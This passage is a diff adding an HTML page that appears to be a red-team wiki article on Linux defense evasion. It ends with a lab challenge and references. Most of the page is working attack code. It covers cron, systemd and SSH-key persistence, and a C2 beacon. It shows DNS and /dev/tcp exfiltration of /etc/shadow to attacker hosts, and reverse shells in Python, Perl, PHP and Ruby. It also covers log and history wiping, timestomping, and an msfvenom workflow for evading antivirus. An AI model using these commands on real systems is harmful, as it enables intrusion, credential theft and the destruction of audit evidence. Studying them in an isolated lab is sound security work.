+echo &#34;*/5 * * * * /dev/shm/.cache_update&#34; | crontab -
+# Parent process of execution: cron (PID varies)
+# Not traceable to your interactive session
+
+# 3. Systemd timer — even more legitimate-looking:
+systemd-run --unit=syslog-cleanup --on-calendar=&#39;*:0/30&#39; /dev/shm/.cache_update
+# Appears as a system service with a descriptive name
+
+# 4. SSH forced command — triggers on each SSH connection:
+# Append to ~/.ssh/authorized_keys:
+# command=&#34;/dev/shm/.cache_update&#34; ssh-ed25519 AAAAC3...
+# No shell history, no auditd trace to your PID
+						</pre>
+						<h4 id="ld-preload-unhooking">LD_PRELOAD Unhooking</h4>
+						<p>
+							If the Linux environment has
+							<abbr title="Endpoint Detection and Response">EDR</abbr>
+							via LD_PRELOAD, strip it
+							before execution:
+						</p>
+						<pre class="bash">
+# Check if LD_PRELOAD is active:
+cat /proc/self/maps | grep -i preload
+
+# Execute with clean environment:
+env -i PATH=/usr/bin:/bin /bin/bash
+# env -i: clear all environment variables
+# The spawned shell has no LD_PRELOAD hooks
+
+# Statically compiled binaries ignore LD_PRELOAD entirely
+# because they don&#39;t use the dynamic linker — another reason to use -static
+						</pre>
+						<p>---</p>
+					</section>
+					<section>
+						<h3 id="network-evasion">Network Evasion</h3>
+						<h4 id="c2-beacon-with-jitter">C2 Beacon with Jitter</h4>
+						<pre class="bash">
+# Beacon that mimics legitimate REST API calls over HTTPS:
+c2_token=&#34;$(cat /dev/urandom | tr -dc &#39;A-Za-z0-9&#39; | head -c 32)&#34;
+echo &#34;$c2_token&#34; &gt; /tmp/beacon_token
+
+while true; do
+    sleep $((30 + RANDOM % 90))  # Jitter: 30-120 seconds
+
+    curl -s -X POST &#34;https://c2.example.com/api/v1/health&#34; \
+        -H &#34;Content-Type: application/json&#34; \
+        -H &#34;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36&#34; \
+        -H &#34;Authorization: Bearer $(cat /tmp/beacon_token)&#34; \
+        -d &#34;{\&#34;status\&#34;:\&#34;ok\&#34;,\&#34;host\&#34;:\&#34;$(hostname)\&#34;,\&#34;ts\&#34;:$(date +%s)}&#34; \
+        --connect-timeout 10 &gt; /dev/null 2&gt;&amp;1
+done &amp;
+# This blends with normal enterprise traffic: HTTPS, JSON, standard UA
+						</pre>
+						<h4 id="protocol-detection-risk-table">Protocol Detection Risk Table</h4>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">Protocol</th>
+									<th align="center">Detection Risk</th>
+									<th align="center">Bandwidth</th>
+									<th align="center">Egress Reliability</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center">Raw TCP (nc)</td>
+									<td align="center">HIGH</td>
+									<td align="center">Max</td>
+									<td align="center">Often blocked</td>
+								</tr>
+								<tr>
+									<td align="center">TLS 1.3 (curl)</td>
+									<td align="center">LOW</td>
+									<td align="center">High</td>
+									<td align="center">Almost always allowed</td>
+								</tr>
+								<tr>
+									<td align="center">DNS TXT</td>
+									<td align="center">MEDIUM</td>
+									<td align="center">~100 B/s</td>
+									<td align="center">Always allowed</td>
+								</tr>
+								<tr>
+									<td align="center">HTTPS/WS (Chisel)</td>
+									<td align="center">LOW</td>
+									<td align="center">High</td>
+									<td align="center">Almost always allowed</td>
+								</tr>
+								<tr>
+									<td align="center">HTTP/2 (curl --http2)</td>
+									<td align="center">VERY LOW</td>
+									<td align="center">High</td>
+									<td align="center">Always allowed</td>
+								</tr>
+								<tr>
+									<td align="center">SMB</td>
+									<td align="center">MED-HIGH</td>
+									<td align="center">High</td>
+									<td align="center">Often internal only</td>
+								</tr>
+							</tbody>
+						</table>
+						<h4 id="dns-exfiltration-chunked">DNS Exfiltration Chunked</h4>
+						<pre class="bash">
+# Exfiltrate a file through DNS A-record queries in small chunks:
+exfiltrate_dns() {
+    local file=&#34;$1&#34; domain=&#34;$2&#34;
+    split -b 32 &#34;$file&#34; /tmp/dns_chunk_
+    for chunk in /tmp/dns_chunk_*; do
+        hex=&#34;$(xxd -p &#34;$chunk&#34; | tr -d &#39;\n&#39;)&#34;
+        dig +short &#34;${hex}.${domain}&#34; A 2&gt;/dev/null
+        sleep $((2 + RANDOM % 5))
+    done
+    rm -f /tmp/dns_chunk_*
+}
+
+exfiltrate_dns /etc/shadow exfil.attacker.com
+# Server-side: extract subdomains from DNS query logs, xxd -r -p to rebuild
+						</pre>
+						<p>---</p>
+					</section>
+					<section>
+						<h3 id="log-evasion">Log Evasion</h3>
+						<h4 id="shell-history-manipulation">Shell History Manipulation</h4>
+						<pre class="bash">
+# Prevent history recording for a session:
+unset HISTFILE
+set +o history
+
+# Delete last command from history:
+history -d $((HISTCMD-1))
+
+# Destroy history files:
+shred -zu ~/.bash_history ~/.zsh_history ~/.mysql_history
+
+# Make history immutable (root):
+chattr +i ~/.bash_history
+						</pre>
+						<h4 id="truncating-system-logs">Truncating System Logs</h4>
+						<pre class="bash">
+# Wipe log files (leaves empty files — detectable):
+: &gt; /var/log/syslog
+: &gt; /var/log/auth.log
+: &gt; /var/log/audit/audit.log
+
+# Selective log removal by timestamp (less detectable):
+sed -i &#39;/Jun 26 02:15:.*sshd.*authentication/d&#39; /var/log/auth.log
+
+# Wipe journal logs selectively:
+journalctl --vacuum-time=1s   # Wipes all but last second
+journalctl --rotate           # Rotate then delete old journals
+rm -rf /var/log/journal/*
+						</pre>
+						<h4 id="timestomping">Timestomping</h4>
+						<pre class="bash">
+# Touch -t: set file timestamp to arbitrary date
+# Format: [[CC]YY]MMDDhhmm[.ss]
+touch -t 202401010000.00 /dev/shm/.cache_update
+
+# Match timestamp of an existing legitimate file:
+touch -r /usr/bin/ls /dev/shm/.cache_update
+
+# Set all three timestamps (atime, mtime) to same reference:
+touch -a -m -r /usr/bin/sshd /tmp/backdoor.sh
+# atime: access time, mtime: modification time
+						</pre>
+						<p>---</p>
+					</section>
+					<section>
+						<h3 id="living-off-the-land-lotl">Living Off the Land (LotL)</h3>
+						<p>Using built-in system tools for operations avoids dropping custom binaries entirely.</p>
+						<pre class="bash">
+# File transfer without wget/curl (using /dev/tcp):
+exec 3&lt;&gt;/dev/tcp/10.0.0.100/4444
+cat /etc/shadow &gt;&amp;3
+
+# Download a file using base64 over DNS or HTTP:
+curl -s http://10.0.0.100/payload.b64 | base64 -d &gt; /dev/shm/.payload
+
+# Python for reverse shell (often available on Linux servers):
+python3 -c &#39;import socket,subprocess,os;
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect((&#34;10.0.0.100&#34;,4444));
+os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1);
+os.dup2(s.fileno(),2);
+subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;])&#39;
+
+# Perl reverse shell:
+perl -e &#39;use Socket;
+$i=&#34;10.0.0.100&#34;;$p=4444;
+socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));
+connect(S,sockaddr_in($p,inet_aton($i)));
+open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);
+exec(&#34;/bin/sh -i&#34;);&#39;
+
+# PHP reverse shell (single line):
+php -r &#39;$s=fsockopen(&#34;10.0.0.100&#34;,4444);
+exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;
+
+# gcc as a living-off-the-land compiler:
+# If gcc is present, compile and execute in-memory
+gcc -x c -o /dev/shm/.tmp - &lt;&lt; &#39;EOF&#39;
+int main(void) { system(&#34;/bin/sh&#34;); return 0; }
+EOF
+/dev/shm/.tmp &amp;&amp; rm /dev/shm/.tmp
+
+# Ruby reverse shell:
+ruby -rsocket -e &#39;exit if fork;
+c=TCPSocket.new(&#34;10.0.0.100&#34;,&#34;4444&#34;);
+while(cmd=c.gets);IO.popen(cmd,&#34;r&#34;){|io|c.print io.read};end&#39;
+						</pre>
+						<p>---</p>
+					</section>
+					<section>
+						<h3 id="practical-evasion-workflow">Practical Evasion Workflow</h3>
+						<p>A systematic approach to building an undetected payload:</p>
+						<pre class="bash">
+# 1. Generate base payload with msfvenom
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.100 LPORT=4444 \
+    -f elf -o payload_raw.elf
+
+# 2. Baseline detection — test against ClamAV
+clamscan payload_raw.elf
+# Expected: detected (too many signatures)
+
+# 3. Extract shellcode into C template
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.100 LPORT=4444 -f c
+
+# 4. Embed shellcode in a custom loader with XOR obfuscation
+# Apply the techniques from Step 2/3 above
+
+# 5. Add junk sections
+dd if=/dev/urandom bs=1024 count=20 &gt;&gt; payload_obf.elf
+
+# 6. Compress with UPX (can work against some engines, but UPX is signatured itself)
+upx payload_obf.elf -o payload_upx.elf  # May increase detections
+
+# 7. Test iteratively
+clamscan payload_obf.elf
+# Repeat Steps 3-7, changing XOR key, function layout, junk size each iteration
+
+# 8. Once undetected by ClamAV, test against your lab EDR (see Containerfile)
+cp payload_obf.elf /tmp/
+# Execute within the evasion-lab container:
+podman exec evasion-lab /tmp/payload_obf.elf
+# Check if auditd/python monitor generates an alert
+						</pre>
+						<p>---</p>
+					</section>
+					<section>
+						<h3 id="challenge">Challenge</h3>
+						<p>
+							The companion container simulates a monitored Linux host so you can measure each technique against
+							a sensor instead of guessing.
+						</p>
+						<p><a href="/wiki/articles/redteam/evasion.Containerfile">evasion.Containerfile</a></p>
+						<p>The image provides:</p>
+						<ul>
+							<li><b>auditd</b> configured to monitor <code>execve</code> , <code>connect</code> , <code>bind</code> , <code>ptrace</code> syscalls</li>
+							<li><b>Python process monitor</b> ( <code>/opt/monitor.py</code> ) that watches <code>/proc</code> for new processes, flags processes with:</li>
+							<li>Suspicious parent-child relationships (bash spawning nc)</li>
+							<li>Listening sockets from non-system paths</li>
+							<li>Execution from <code>/dev/shm</code> or <code>/tmp</code></li>
+							<li><b>Logging</b> to <code>/var/log/edr-sim.log</code> with timestamped alerts</li>
+						</ul>
+						<p>
+							The container includes gcc, python3, nasm, and other build tools for compiling and testing evasion
+							payloads.
+						</p>
+						<h4 id="lab-objectives">Lab objectives</h4>
+						<ol>
+							<li>Compile a naive reverse shell. Run it. Observe the Python monitor flagging it.</li>
+							<li>Apply process masquerading ( <code>exec -a</code> ). Re-run. Does the monitor still catch it?</li>
+							<li>Compile the raw-syscall version. Does auditd still log the execve?</li>
+							<li>Use fileless execution via <code>/dev/shm</code> with immediate unlink. Does the monitor detect the deleted binary?</li>
+							<li>Write a custom Python shellcode loader that never calls execve. Compare auditd logs.</li>
+						</ol>
+						<pre class="bash">
+# Build the lab:
+podman build -t evasion-lab -f evasion.Containerfile .
+
+# Run with the capabilities auditd needs and a port for callback testing:
+podman run -it --rm --name evasion-lab \
+    --cap-add NET_ADMIN \
+    --cap-add AUDIT_WRITE \
+    --cap-add AUDIT_CONTROL \
+    -p 4444:4444 \
+    -v ./src:/src:Z \
+    evasion-lab
+
+# Inside the container - the monitor is already running:
+cat /var/log/edr-sim.log                  # View alerts
+
+# Compile and test the naive reverse shell:
+cd /src
+gcc -o naive_revshell naive_revshell.c
+./naive_revshell &amp;
+# Check alerts:
+tail /var/log/edr-sim.log
+
+# Test raw syscall version:
+gcc -nostdlib -static -O2 -s -Wl,--entry=_start \
+    -o raw_revshell raw_syscall_revshell.c
+./raw_revshell &amp;
+# Compare auditd logs:
+ausearch -m SYSCALL -sv no | aureport -x --summary
+
+# Test fileless Python shellcode:
+python3 /src/python_shellcode_loader.py &amp;
+# The Python process never calls execve — auditd sees nothing
+# But the process monitor may still flag the socket connection
+						</pre>
+					</section>
+					<section>
+						<h3 id="references">References</h3>
+						<ul>
+							<li><a class="icon-website" href="https://man7.org/linux/man-pages/man2/memfd_create.2.html" target="_blank">memfd_create(2) - Linux man page</a> - anonymous in-memory files</li>
+							<li><a class="icon-website" href="https://man7.org/linux/man-pages/man2/execveat.2.html" target="_blank">execveat(2) - Linux man page</a> - the syscall behind fexecve</li>
+							<li><a class="icon-website" href="https://man7.org/linux/man-pages/man8/auditd.8.html" target="_blank">auditd - Linux man page</a> - rule syntax and the audit log</li>
+							<li><a class="icon-website" href="https://attack.mitre.org/tactics/TA0005/" target="_blank">MITRE ATT&CK - Defense Evasion</a> - technique catalogue and detection notes</li>
+							<li><a class="icon-github" href="https://github.com/arget13/DDexec" target="_blank">DDexec</a> - self-overwriting process execution</li>
+							<li><a class="icon-website" href="https://lolbas-project.github.io/" target="_blank">Living Off The Land Binaries, Scripts and Libraries</a> - built-in binaries useful during post-exploitation</li>
+						</ul>
+					</section>
+				</article>
+			</main>
+		</div>
+
+		<footer>
+			<div></div>
+			<div class="print-not">Made with 💔 in Germany. &copy; Cookie Engineer (https://cookie.engineer). All rights (and jokes) reserved under European Law.</div>
+			<div></div>
+		</footer>
+
+	</body>
+</html>
